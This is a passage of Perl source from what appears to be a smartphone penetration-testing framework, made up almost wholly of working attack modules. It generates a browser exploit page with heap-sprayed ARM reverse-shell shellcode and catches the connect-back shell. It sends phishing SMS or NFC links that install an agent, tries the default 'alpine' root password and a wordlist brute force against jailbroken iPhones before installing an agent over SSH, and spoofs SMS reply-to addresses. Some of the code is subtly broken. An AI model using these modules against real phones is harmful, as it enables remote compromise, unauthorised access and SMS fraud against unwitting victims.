			print SPLOITFILE "var scode = nop+unescape(\"\\u1001\\ue1a0\\u0002\\ue3a0\\u1001\\ue3a0\\u2005\\ue281\\u708c\\ue3a0\\u708d\\ue287\\u0080\\uef00\\u6000\\ue1a0\\u1084\\ue28f\\u2010\\ue3a0\\u708d\\ue3a0\\u708e\\ue287\\u0080\\uef00\\u0006\\ue1a0\\u1000\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1001\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1002\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u2001\\ue28f\\uff12\\ue12f\\u4040\\u2717\\udf80\\ua005\\ua508\\u4076\\u602e\\u1b6d\\ub420\\ub401\\u4669\\u4052\\u270b\\udf80\\u2f2f\\u732f\\u7379\\u6574\\u2f6d\\u6962\\u2f6e\\u6873\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u0002\");\n";
			print SPLOITFILE "scode += port;\n";
			print SPLOITFILE "scode += ip;\n";
			print SPLOITFILE "scode += unescape(\"\\u2000\\u2000\");\n";
			print SPLOITFILE "target = new Array();\n";
			print SPLOITFILE "for(i = 0; i < 0x1000; i++)\n";
			print SPLOITFILE "target[i] = scode;\n";
			print SPLOITFILE "for (i = 0; i <= 0x1000; i++)\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "document.write(target[i]+\"<i>\");\n";
			print SPLOITFILE "if (i>0x999)\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "trigger();\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "</script>\n";
			print SPLOITFILE "</head>\n";
			print SPLOITFILE "<body id=\"BodyID\">\n";
			print SPLOITFILE "Enjoy!\n";
			print SPLOITFILE "<script>\n";
			print SPLOITFILE "exploit();\n";
			print SPLOITFILE "</script>\n";
			print SPLOITFILE "</body>\n";
			print SPLOITFILE "</html>\n";
        		close(SPLOITFILE);
			$modem = get_modem();
                	if ($modem == 0)
                	{
                       		print "\nNo modems found. Attach a modem to use this functionality\n";
                	}
               		 else
                	{
               	 		$username = $Variables{"MYSQLUSER"};
                		$password = $Variables{"MYSQLPASS"};
                		$port = $Variables{"MYSQLPORT"};
                		 $type = $Variables{"DATABASETYPE"};
				if ($type eq "postgres")
                		{
                        		$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				}
  				elsif ($type eq "mysql")
                		{     
			  		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                		}
				$pathquery = "SELECT path from modems where id=" . $modem;
                        	$sql = $dbh->prepare($pathquery);
                        	$results = $sql->execute;
				@rows = $sql->fetchrow_array();
                        	$path2 = @rows[0];
                        	$keyquery = "SELECT controlkey from modems where id=" . $modem;
                        	$sql = $dbh->prepare($keyquery);
                        	$results2 = $sql->execute;
                        	@rows = $sql->fetchrow_array();
                        	$key2 = @rows[0];
				$modemtypequery = "SELECT type from modems where id=" . $modem;
				$sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
				if ($modemtype2 eq "usb")
				{
					$usb = Device::SerialPort->new("/dev/ttyUSB2");
	                                $usb->databits(8);
                                	$usb->baudrate(115200);
                                	$usb->parity("none");
                                	$usb->stopbits(1);
                                	$usb->write("ATZ\r\n");
                                	sleep(1);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
                                	$usb->write("AT+CMGF=1\r\n");
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
					$numberline = "AT+CMGS=\"" . $number . "\"\r\n";
                                	$usb->write($numberline);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
					if (lc($custom) eq "n")
					{
                                	$msg = "This is a cool page: " . $link;	
					}
					elsif(lc($custom) eq "y")
					{
					print "Enter SMS text:";
					$customtext = <>;
					chomp($customtext);
					$msg = $customtext . " " . $link;
					}					
					$usb->write($msg.pack('c',26));
                                	sleep(2);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
                                	$usb->close();

				}
				elsif ($modemtype2 eq "app") 
				{
                        		$control = $webserver . $path2 . "/getfunc";
                        		open(CONTROLFILE, ">$control");
					if (lc($method) eq "sms")
					{

if (lc($custom) eq "n")
					{
                                        $msg = "This is a cool app: " 
					}
					elsif (lc($custom) eq "y")
					{
					print "Enter SMS text:";
					$customtext = <>;
					chomp($customtext);
					$msg = $customtext;
					}
					$command2 = $key2 . " " . "SEND" . " " . $number . " " . $msg . $link;
					}
					elsif (lc($method) eq "nfc")
					{
					$command2 = $key2 . " " . "NFCC" . " " . $link;
					}

                        		print CONTROLFILE $command2;
                        		close(CONTROLFILE);
				}
				$vulnerable = "no";
				$socket = new IO::Socket::INET (LocalHost => $shellipaddress, LocalPort => '12345', Proto => 'tcp' , Listen => 1, Reuse => 1, Timeout=> 180);
				if ($data_socket = $socket->accept())
				{
					$data="/system/bin/id\n";
					print $data_socket $data;
					$data=<$data_socket>;
					print $data;
					close($data_socket);
					$vulnerable = "yes";
				}
				print "\nVulnerable: " . $vulnerable . "\n\n"; 
				$table = "client";
        			$sqlserver = $Variables{"MYSQLSERVER"};
        			$username = $Variables{"MYSQLUSER"};
        			$password = $Variables{"MYSQLPASS"};
        			$port = $Variables{"MYSQLPORT"};
        			 $type = $Variables{"DATABASETYPE"};
				if ($type eq "postgres")
                		{
                        		$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
					$number2 = "\'" . $number . "\'";
                                	$vulnerable2 = "\'" . $vulnerable . "\'";
                                	$webkit = "\'" . "webkit" . "\'";
				}
  				elsif ($type eq "mysql")
                		{     
			  		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                		
  				$number2 = "\"" . $number . "\"";
				$vulnerable2 = "\"" . $vulnerable . "\""; 
				$webkit = "\"" . "webkit" . "\"";
				}
				$insertquery = "INSERT INTO $table (id,number,exploit,vuln) VALUES (DEFAULT,$number2,$webkit,$vulnerable2)";
				$sql = $dbh->prepare($insertquery);
				$sql->execute;
				last;
			}
		}

	}
}

sub direct_download
{
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
        while(1)
        {
                print "This module sends an SMS with a link to directly download and install an Agent\n";
                print "Platform(Android/iPhone/Blackberry):";
                $platform = <>;
		print "Hosting Path:";
		$path = <>;
		print "Filename:";
		$filename = <>;
		print "Delivery Method:(SMS or NFC)";
		$method = <>;
		chomp($method);
		if (lc($method) eq "sms")
		{
			print "Phone Number to Attack:";
			$number = <>;
			print "Custom text(y/N)?";
			$custom = <>;
			chomp($number);
			chomp($custom);
		}
		
		chomp($platform);
		chomp($path);
		chomp($filename);
		if (lc($platform) eq "android")
		{
			$link = "http://" . $ipaddress . $path . $filename;
			 $fullpath = $webserver. $path;
		        $command1 = "mkdir " . $fullpath;
        		system($command1);
			$location = $Variables{"ANDROIDAGENT"};
			$command = "cp " . $location . " " . $webserver . $path . $filename;
			system($command);
			  $modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use this functionality\n";
                        }
                        else
                        {
                		$username = $Variables{"MYSQLUSER"};
                		$password = $Variables{"MYSQLPASS"};
                		$port = $Variables{"MYSQLPORT"};
    				$type = $Variables{"DATABASETYPE"};
				if ($type eq "postgres")
                		{
                        		$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				}
  				elsif ($type eq "mysql")
                		{     
			  		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                		}
			 	$pathquery = "SELECT path from modems where id=" . $modem;
                          	$sql = $dbh->prepare($pathquery);
                                $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];
			 	$keyquery = "SELECT controlkey from modems where id=" . $modem;
                                $sql = $dbh->prepare($keyquery);
                                $results2 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $key2 = @rows[0];
				  $modemtypequery = "SELECT type from modems where id=" . $modem;
                                $sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
                                if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new
("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
                                        $usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->write("AT+CMGF=1\r\n");
                                        $line = read_modem($usb);
                                        print $line;
					  sleep(1);
                                        $numberline = "AT+CMGS=\"" . $number . "\"\r\n";
                                        $usb->write($numberline);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
					if (lc($custom) eq "n")
					{
                                        $msg = "This is a cool app: " . $link; 
					}
					elsif (lc($custom) eq "y")
					{
					print "Enter SMS text:";
					$customtext = <>;
					chomp($customtext);
					$msg = $customtext . " " . $link;
					}                                        
					$usb->write($msg.pack('c',26));
                                        sleep(5);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->close();

                                }
                                elsif ($modemtype2 eq "app") 
                                {
				 	$control = $webserver . $path2 . "/getfunc";
                        		open(CONTROLFILE, ">$control");
					if (lc($method) eq "sms")
					{

					if (lc($custom) eq "n")
					{
                                        $msg = "This is a cool app: " 
					}
					elsif (lc($custom) eq "y")
					{
					print "Enter SMS text:";
					$customtext = <>;
					chomp($customtext);
					$msg = $customtext;
					}
					$command2 = $key2 . " " . "SEND" . " " . $number . " " . $msg . $link;
					}
					elsif (lc($method) eq "nfc")
					{
					$command2 = $key2 . " " . "NFCC" . " " . $link;
					}
                        		print CONTROLFILE $command2;
                       			close(CONTROLFILE);
				}
				last;
			}
		}
	}


}

sub remote_attack
{
	$webserver = $Variables{"WEBSERVER"};
	$sqlserver = $Variables{"MYSQLSERVER"};
	while(1)
	{
		print "\n\nChoose a remote attack to launch:\n";
                print "\t1.) Test for Default SSH Password (iPhone)\n";
		print "\t2.) Guess SSH Password (iPhone)\n";
		print "\t3.) Spoof Sender Address SMS (iPhone)\n";
                print "spf>";
                $choice1 = <>;
		chomp($choice1);
		if ($choice1 == 1)
		{
			alpine();
		}
		if ($choice1 == 2)
		{
			sshguess();
		}
		if ($choice1 == 3)
		{
			senderspoof();
		}
                if (($choice1 == "exit") || ($choice1 == 0))
                {
                        return;
                }

	}

}

sub getusbmodem
{

   $sqlserver = $Variables{"MYSQLSERVER"};
        while(1)
        {
                $username = $Variables{"MYSQLUSER"};
                $password = $Variables{"MYSQLPASS"};
                $port = $Variables{"MYSQLPORT"};
                $type = $Variables{"DATABASETYPE"};
                if ($type eq "postgres")
                {
                        $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
                	$rowquery = "SELECT COUNT(*) from modems where type=" . "\'usb\'";

                }
		if ($type eq "mysql")
		{
			 $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
   			$rowsquery = "SELECT COUNT(*) from modems where type=" . "\"usb\"";
                }
		$sql = $dbh->prepare($rowsquery);
                $results = $sql->execute;
                @rows = $sql->fetchrow_array();
                $row = @rows[0];
                if ($row eq 0)
                {
                        return 0;
                }
                if ($row eq 1)
                {
                        return 1;
                }
                print "\n\nAvailable Modems:\n\n";
		$rowsquery2 = "SELECT COUNT(*) from modems";
                $sql = $dbh->prepare($rowsquery2);
                $results2 = $sql->execute;
                @rows2 = $sql->fetchrow_array();
                $row2 = @rows2[0];
		 for($i=1; $i<=$row2; $i++)
                {
			$selectquery = "SELECT type from modems where id=" . $i;
                        $sql = $dbh->prepare($selectquery);
                        $results = $sql->execute;
                        @rows = $sql->fetchrow_array();
                        $r = @rows[0];
			if ($r eq "usb")
			{
                        	$selectquery = "SELECT number from modems where id=" . $i;
                        	$sql = $dbh->prepare($selectquery);
                        	$results = $sql->execute;
                        	@rows = $sql->fetchrow_array();
                        	$r = @rows[0];
                        	print "\t" . $i . ".) " . $r . "\n";
                	}
		}
                print "\nSelect a modem to interact with\n";
                print "\nspf>";
                $chosenmodem = <>;
                if ($chosenmodem <= $row2)
                {
                        return $chosenmodem;
                }
        }


}

sub senderspoof
{
	print "This module allows you to spoof the Reply-to address on an SMS using the User Data Header (UDH). This attack only works against iPhones. Currently this attack requires a USB mobile modem and does not work  with the SPF app.\n";
	print "Select a USB modem to use for the attack:\n";
	$modem = getusbmodem();
        if ($modem == 0)
        {
                  print "\nNo USB modems found. Attach a USB modem to use this functionality\n";
        }
	else 
	{
		print "This functionality isn't perfect yet. There is something is wrong with the fill bits on the UDH if it does not meet on a septet boundary. The message will be managled. To get it to work use a 4 digit spoofed number ie 1234 or 9999.\n\n";
		print "Number to Attack:";
                $numberattack = <>;
                print "Message:";
                $message = <>;
                print "Spoofed Reply-To Address:";
                $spoof = <>;
                chomp($numberattack);
                chomp($message);
                chomp($spoof);
		print "\n\nNumber to Attack: " . $numberattack . "\nMessage: " . $message . "\nSpoofed Reply-To Address: " . $spoof  . "\nIs this correct?(y/N):";
		$correct = <>;
		chomp($correct);
                if (lc($correct) eq "y")
                {
			$pdu = "004100";
			$ef = 0;
			$len = length($numberattack);
			#print $len;
			if ($len % 2)
			{
				$ef = 1;
			}
			$attacklenhex = sprintf("%02X", $len);
			#print $attacklenhex;
			$pdu = $pdu . $attacklenhex;
			$scrambledattack = '';
			for($i=0; $i<$len-2; $i=$i+2)
			{
				$sub = substr($numberattack, $i+1, 1);
				$scrambledattack = $scrambledattack . $sub;
				    $sub = substr($numberattack, $i, 1);
                                $scrambledattack = $scrambledattack . $sub;

			}
			if ($ef eq 1)
			{
				$scrambledattack = $scrambledattack . "F";
				$sub = substr($numberattack, len - 1, 1);
				$scrambledattack = $scrambledattack . $sub;
			}
			else 
			{
				$sub = substr($numberattack, $i+1, 1);
                                $scrambledattack = $scrambledattack . $sub;
                                    $sub = substr($numberattack, $i, 1);
                                $scrambledattack = $scrambledattack . $sub;

			}
				#print $scrambledattack;
			
			$pdu = $pdu . "91" . $scrambledattack . "0000";
			$eff = 0;
			$len = length($spoof);
                        #print "length: " . $len . "\n";
                        if ($len % 2)
                        {
                                $eff = 1;
                        }
                        $spooflenhex = sprintf("%02X", $len);
                        #print "Spoofhexlen:" . $spooflenhex . "\n";
                        $scrambledspoof = '';
                        for($i=0; $i<$len-2; $i=$i+2)
                        {
                                $sub = substr($spoof, $i+1, 1);
                                $scrambledspoof = $scrambledspoof . $sub;
                                    $sub = substr($spoof, $i, 1);
                                $scrambledspoof = $scrambledspoof . $sub;

                        }
                        if ($eff eq 1)
			  {
                                $scrambledspoof = $scrambledspoof . "F";
                                $sub = substr($spoof, len - 1, 1);
                                $scrambledspoof = $scrambledspoof . $sub;
			}
			else 
			{
 				  $sub = substr($spoof, $i+1, 1);
                                $scrambledspoof = $scrambledspoof . $sub;
                                    $sub = substr($spoof, $i, 1);
                                $scrambledspoof = $scrambledspoof . $sub;



			}
                                #print $scrambledspoof;
                        	$uhd = $spooflenhex . "91" . $scrambledspoof;
				#print "UHD1: " . $uhd . "\n";
				$udhlen1 = (length($uhd))/2;
				#print "length1 " . $udhlen1 . "\n";
				$uhd = "220" . $udhlen1 . $uhd;
				#print "UHD2 " . $uhd . "\n";
				$udhlen2 = (length($uhd))/2;
				$more = (($udhlen2 + 1) * 8) % 7;
				#print "More: " . $more;
				if ($more !=0)
				{
					$more2 = '0' x (7 - $more);
					#print "More2: " . $more2;
				}
				else 
				{
					$more2 = "";
				}
				#print "length2 " . $udhlen2 . "\n";
				$uhdlenhex = sprintf("%02X", $udhlen2);
				$uhd = $uhdlenhex . $uhd;
				#print "UHD:" . $uhd . "\n";
				
				$bin = '';
				$len = length($message);	
				$bits = unpack("B*",$message);
				$bits = $more2 . $bits;
				#print "BITS: " . $bits . "\n";
				$bitslength = length($bits);
				$octetlength = $bitslength/8;
				#print "\n" . $octetlength . "\n";
				$septets = '';
				for ($i = 0; $i<$octetlength; $i++)
				{
					$start = $i * 8;
					$oct = substr($bits, $start, 8);
					$sept = substr($oct, 1, 7);
					$septets = $septets . $sept;	
				}
				#print "\nSeptets " . $septets . "\n";
				$septetlength = length($septets)/7;
				#print "\n" . $septetlength . "\n";
				$eat = 1;
				$eaten = 0;
				$ud = "";
				for ($j = 0; $j<($septetlength - 1); $j++)
				{
					$start = $j * 7;
				#	print "\nEaten: " . $eaten . "\n";
				$first = substr($septets, $start, (7-$eaten));  
				#	print "\nFirst: " . $first . "\n";
					$start2 = ($j+1) * 7;
					$second = substr($septets, $start2, 7);
					$food = 7-$eat;
					$stolen = substr($second, $food, $eat);
					$encode = $stolen . $first;
				#	print "\n" . $encode . "\n";
					$hexy = unpack("H*", pack("B*",$encode));
					$eat++;
					$eat = ($eat % 8);
					$eaten++;
					$eaten = ($eaten % 8);
				#	print $hexy;
					$ud = $ud . $hexy;
				}
			          $first = substr($septets, (($septetlength - 1) * 7) , (7-$eaten));
 				#print "\n First: " . $first . "\n"; 
				$fill = 1 + $eaten;
				$zeos = "0" x $fill;
				$encode = $zeos . $first;
				#print "\n Encode: " . $encode . "\n";  
				$hexy = unpack("H*", pack("B*",$encode));
				 $ud = $ud . $hexy;
				#print "\nUD: " . $ud . "\n";
				$ud = $uhd . $ud;
				$udlength = length($ud);
				$udlength2 = $udlength/2;
				$extra = int($udlength2/7);
				$udlength3 = $udlength2 + $extra; 
				  $udlenhex = sprintf("%02X", $udlength3);
				$pdu = $pdu . $udlenhex . $ud;
				#print "\n PDU: " . $pdu . "\n";
				$pdulen = (length($pdu)/2) - 1;
				#print "PDULENGTH: " . $pdulen . "\n";
			 $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                $usb->databits(8);
                                $usb->baudrate(115200);
                                $usb->parity("none");
                                $usb->stopbits(1);
                                $usb->write("ATZ\r\n");
                                sleep(1);
                                $line = read_modem($usb);
                                print $line;
                                sleep(1);
                                $usb->write("AT+CMGF=0\r\n");
                                $line = read_modem($usb);
                                print $line;
                                sleep(1);
                                $usb->write("AT+CMGS=" . $pdulen . "\r\n");
				#$usb->write("AT+CMGS=27\r\n");

                                $line = read_modem($usb);
                                print $line;
                                sleep(1);
				$msg = $pdu;
                                #$msg = "0041000B916110831316F900000F0A22080B915117344588F142A701";
                                $usb->write($msg.pack('c',26));
                                sleep(10);
                                $line = read_modem($usb);
 				print $line;
				$usb->close();
		}
	}



}



sub sshguess
{

	 $webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};

        while(1)
        {
                print "This module attempts to guess the password for an Jailbroken iPhone on the local network by reading from a supplied password list\n";
                print "IP address:";
                $ipaddress = <>;
                chomp($ipaddress);
		print "Password file:";
		$passfile  = <>;
                print "\n\nIP Address:" .  $ipaddress .  "\nPassword file:" . $passfile . "\nIs this correct?(y/N):";
                $correct = <>;
                chomp($correct);
		if (lc($correct) eq "y")
                {
                        guesspass($ipaddress, $passfile);
			last;
		}

	}



}

sub guesspass
{
	$ipaddress = $_[0];
	$passfile = $_[1];
	$vulnerable = "no";
        $agent = "no";
        $command = 'sftp';
        $param = "root@" . $ipaddress;
        $timeout = 10;
        $notfound = "ssh: connect to host " . $ipaddress . " port 22: Connection refused";
        $passwordstring = $parm . "'s password: ";
        $location = $Variables{"IPHONEAGENT"};
  	$putfile = $location;
        $connectstring = "Connecting to " . $ipaddress . "...";
        $installcommand = "dpkg -i " . "iphone.deb" . "\n";
	$guesspassword = "null";
	 open(READFILE, "+<$passfile");
	 while(<READFILE>)
	{
		$guess = $_;
		$guess2 = $guess . "\n";
		  $exp = Expect->spawn($command, $param) or die "Cannot spawm sftp command";
                        $exp->expect($timeout,[$connectstring]);
                        $exp->expect($timeout,["Are you sure you want to continue connecting (yes/no)?", sub {my $self = shift; $self->send("yes\n");}]); #[$notfound, return]);
                        $exp->expect($timeout, $passwordstring);
                        $exp->send($guess2);
                        if ($exp->expect($timeout, ["sftp>"]))
                        {
                                $vulnerable="yes";
                                print "PASSWORD FOUND: " . $guess . "\n";
				$guesspassword = $guess;
				 $exp->send("put $putfile\n");
                        	$exp->expect($timeout, ["sftp>"]);
                        	$exp->send("bye\n");
                        	$command2 = "ssh";
                        	$exp = Expect->spawn($command2, $param);
                        	$exp->expect($timeout, $passwordstring);
                        	$exp->send($guess2);
                        	$exp->expect($timeout, [qr'root\s*']);
                        	$exp->send($installcommand);
                        	$exp->expect($timeout, "Setting up com.bulbsecurity.tooltest (0.0.1-23) ...");
                        	$exp->send("tooltest\n");
                        	if($exp->expect($timeout,["Smartphone Pentest Framework Agent"]))
                        	{
                                	$agent="yes";
                        	}
                        	$exp->send("exit");
                        	$exp->soft_close();
				last;
                        }
	}
	  print "\nVulnerable: " . $vulnerable . "\nAgent: " . $agent;
 	 $table = "remote";
	$guessstring = "Guess: " . $guesspassword;
         $sqlserver = $Variables{"MYSQLSERVER"};
         $username = $Variables{"MYSQLUSER"};
         $password = $Variables{"MYSQLPASS"};
         $port = $Variables{"MYSQLPORT"};
         $type = $Variables{"DATABASETYPE"};
         if ($type eq "postgres")
         {
                    $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
                    $ip2 = "\'" . $ipaddress . "\'";
                    $vulnerable2 = "\'" . $vulnerable . "\'";
                    $agent2 = "\'" . $agent . "\'";
                    $exploit = "\'" . $guessstring . "\'";

                        }
                        elsif ($type eq "mysql")
                        {
                                $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                $ip2 = "\"" . $ipaddress . "\"";
                                $vulnerable2 = "\"" . $vulnerable . "\"";
                                $agent2 = "\"" . $agent . "\"";
                                $exploit = "\"" . $guessstring . "\"";
                        }
                        $insertquery = "INSERT INTO $table (id,ip,exploit,vuln,agent) VALUES (DEFAULT,$ip2,$exploit,$vulnerable2,$agent2)";
                        $sql = $dbh->prepare($insertquery);
                        $sql->execute;



}



sub alpine 
{
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};

	while(1)
	{
		print "This module tests for an Jailbroken iPhone with a default password on the local network\n";
        	print "IP address:";
                $ipaddress = <>;
                chomp($ipaddress);
		print "\n\nIP Address:" .  $ipaddress .  "\nIs this correct?(y/N):";
		$correct = <>;
		chomp($correct);
                if (lc($correct) eq "y")
		{
			$vulnerable = "no";
			$agent = "no";
			$command = 'sftp';
			$param = "root@" . $ipaddress;
			$timeout = 10;
			$notfound = "ssh: connect to host " . $ipaddress . " port 22: Connection refused";
			$passwordstring = $parm . "'s password: ";
			   $location = $Variables{"IPHONEAGENT"};
			$putfile = $location;
			$connectstring = "Connecting to " . $ipaddress . "...";
			$installcommand = "dpkg -i " . "iphone.deb" . "\n";
			$exp = Expect->spawn($command, $param) or die "Cannot spawm sftp command";
			$exp->expect($timeout,[$connectstring]);
			$exp->expect($timeout,["Are you sure you want to continue connecting (yes/no)?", sub {my $self = shift; $self->send("yes\n");}]); #[$notfound, return]);
			$exp->expect($timeout, $passwordstring);
			$exp->send("alpine\n");
			if ($exp->expect($timeout, ["sftp>"]))
			{
				$vulnerable="yes";
				print "Vulnerable\n";
			}
			$exp->send("put $putfile\n");
			$exp->expect($timeout, ["sftp>"]);
			$exp->send("bye\n");
			$command2 = "ssh";
			$exp = Expect->spawn($command2, $param);
			$exp->expect($timeout, $passwordstring);
                        $exp->send("alpine\n");
			$exp->expect($timeout, [qr'root\s*']); 
			#$installcommand = "dpkg -i  com.bulbsecurity.tooltest_0.0.1-23_iphoneos-arm.deb\n";
			$exp->send($installcommand);
			$exp->expect($timeout, "Setting up com.bulbsecurity.tooltest (0.0.1-23) ...");
			$exp->send("tooltest\n");
			if($exp->expect($timeout,["Smartphone Pentest Framework Agent"]))
			{
				$agent="yes";
			}
			$exp->send("exit");
			$exp->soft_close();
			print "\nVulnerable: " . $vulnerable . "\nAgent: " . $agent;
			$table = "remote";
        		$sqlserver = $Variables{"MYSQLSERVER"};
        		$username = $Variables{"MYSQLUSER"};
        		$password = $Variables{"MYSQLPASS"};
        		$port = $Variables{"MYSQLPORT"};
        		$type = $Variables{"DATABASETYPE"};
			if ($type eq "postgres")
                	{
                        	$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				$ip2 = "\'" . $ipaddress . "\'";
                                $vulnerable2 = "\'" . $vulnerable . "\'";
                                $agent2 = "\'" . $agent . "\'";
                                $alpine = "\'" . "alpine" . "\'";

			}
  			elsif ($type eq "mysql")
                	{     
			 	$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
  				$ip2 = "\"" . $ipaddress . "\"";
				$vulnerable2 = "\"" . $vulnerable . "\"";
				$agent2 = "\"" . $agent . "\""; 
				$alpine = "\"" . "alpine" . "\"";
			}
			$insertquery = "INSERT INTO $table (id,ip,exploit,vuln,agent) VALUES (DEFAULT,$ip2,$alpine,$vulnerable2,$agent2)";
			$sql = $dbh->prepare($insertquery);
			$sql->execute;
			last;
		}
	}

}
sub get_modem
{
	$sqlserver = $Variables{"MYSQLSERVER"};
	while(1)
	{
                $username = $Variables{"MYSQLUSER"};
                $password = $Variables{"MYSQLPASS"};
                $port = $Variables{"MYSQLPORT"};
    		$type = $Variables{"DATABASETYPE"};
 		if ($type eq "postgres")
                {
                        $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
		

		}
  		elsif ($type eq "mysql")
                {     
			  $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);

                }

		$rowsquery = "SELECT COUNT(*) from modems";
		$sql = $dbh->prepare($rowsquery);
		$results = $sql->execute;
		@rows = $sql->fetchrow_array();
		$row = @rows[0];
		if ($row eq 0)
		{
			return 0;
		}
		if ($row eq 1)
		{
			return 1;
		}
		print "\n\nAvailable Modems:\n\n";

		for($i=1; $i<=$row; $i++)
		{
			$selectquery = "SELECT number from modems where id=" . $i;
			$sql = $dbh->prepare($selectquery);
			$results = $sql->execute;
			@rows = $sql->fetchrow_array();
			$r = @rows[0];
			print "\t" . $i . ".) " . $r . "\n";
		}
		print "\nSelect a modem to interact with\n";
		print "\nspf>";
		$chosenmodem = <>;
		if ($chosenmodem <= $row)
		{
			return $chosenmodem;
		}
	}

}

sub read_modem
{
	$reader = $_[0];
	$ret="";
        $timeout = 2
        while ($timeout > 0);
        {
                 ($byte,$saw)=$reader->read(255);
                 if ($byte > 0)
                 {
                          $ret.=$saw
                 }
                 else {
 			  $timeout--;
                 }
        }
	return $ret;

}

sub add_modem
{
	 $webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
	while(1)
	{
		print "\n\nChoose a type of modem to attach to:\n";
		print "\t1.) Search for attached modem\n";
		print "\t2.) Attach to a smartphone based app\n";
		print "\t3.) Generate smartphone based app\n";
		print "\t4.) Copy App to Webserver\n";
		print "\t5.) Install App via ADB\n";
		print "spf>";
		$choice6 = <>;
		if ($choice6 == 1)
		{
			if (-e "/dev/ttyUSB2")
			{
				print "USB Modem Found\n";
				$usb = Device::SerialPort->new("/dev/ttyUSB2");
				$usb->databits(8);
				$usb->baudrate(115200);
				$usb->parity("none");
				$usb->stopbits(1);
				$usb->write("ATZ\r\n");
				sleep(1);
				$line = read_modem($usb);
				print $line;
				#sleep(1);
				#$usb->write("AT+CMGF=1\r\n");
				#$line = read_modem($usb);
				#print $line;
				#sleep(1);
				#$usb->write("AT+CMGS=\"16013831619\"\r\n");
 				#$line = read_modem($usb);
                                #print $line;
				#sleep(1);
				#$msg = "hi";
				#$usb->write($msg.pack('c',26));
				#sleep(10);
				#$line = read_modem($usb);
                                #print $line;
				#sleep(60);
				#$line = read_modem($usb);
				#print $line;
				#@values1 = split(//,$line);
				#$subber = substr($line, 2,6);
				#print $subber; 
				#$get = "+CMTI:";
				#if ($subber  eq $get)
				#{
		
				#	@values2 = split(',',$line);
				#	$offset = @values2[1];
				#	$usb->write("AT+CPMS=\"SM\"\r\n");
				#	sleep(1);
				#	$line = read_modem($usb);
				#	$msg = 	"AT+CMGR=" . $offset . "\r\n";
				#	$usb->write($msg);
				#	sleep(2);
				#	$line = read_modem($usb);
				#	print $line;
				#	@values3 = split('"',$line);
				#	$len = scalar @values3;
				#	shift(@values3);
 				 #	shift(@values3);
  				#	shift(@values3);
  				#	shift(@values3);
  				#	shift(@values3);
  				#	shift(@values3);
				#	$firstring = join("", @values3);
				#	chomp($firstring);
				#	$len = length($firstring);
				#	print $len;
				#	$amount = $len - (2 + 7);
				#	$stringtwo = substr($firstring, 2, $amount);
				#	$sectionlength = length($arraystring);
				#	$hi = "Hi";
				#	if ($stringtwo eq $hi)
				#	{
				#		print "yes";
				#	}
				#	else 
				#	{
				#		print "no";
				#	}			
				$usb->close();
				#}
				$path = "/zoom";
				$number = "/dev/ttyUSB2";
				$key = "NULL";
				$modemtype = "usb";
				make_files2($path);
				database_add2($number,$path,$key,$modemtype);
				last;
			}
			else
			{
				print "No USB Modem Found\n";
				last;
			}
		}
		if ($choice6 == 2)
		{
			app_connect();
			last;
		}
		if ($choice6 == 3)
		{
			app_make();
			last;
		}
		if ($choice6 == 4)
		{
			copyapp();
			last;
		}
		if ($choice6 == 5)
		{
			appadb();
			last;
		}
		if ($choice6 == 0)
		{
